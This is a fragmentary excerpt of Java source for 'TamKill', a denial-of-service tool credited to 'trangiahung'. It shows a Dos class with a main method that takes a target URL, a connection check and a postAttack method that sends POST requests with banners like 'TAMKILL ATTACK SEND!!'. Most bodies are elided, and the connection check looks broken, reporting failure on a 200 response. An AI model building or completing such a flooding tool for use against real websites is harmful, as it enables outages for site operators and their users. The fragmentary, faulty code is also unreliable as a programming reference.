...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("TamKill processing...: " + url );

        String[] SUrl = url.split("://");

        System.out.println("Welcome to TamKill");
        ...
        System.out.println("TamKill by trangiahung");
        ...
        System.out.println("TamKill starting attack");
    ...
    private void checkConnection(String url) throws Exception {
        ...
        if (responseCode == 200) {
            System.out.println("Tamkill can't connect to website");
        }
        Dos.url = url;
    }
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("TAMKILL ATTACK SEND!!");
    }
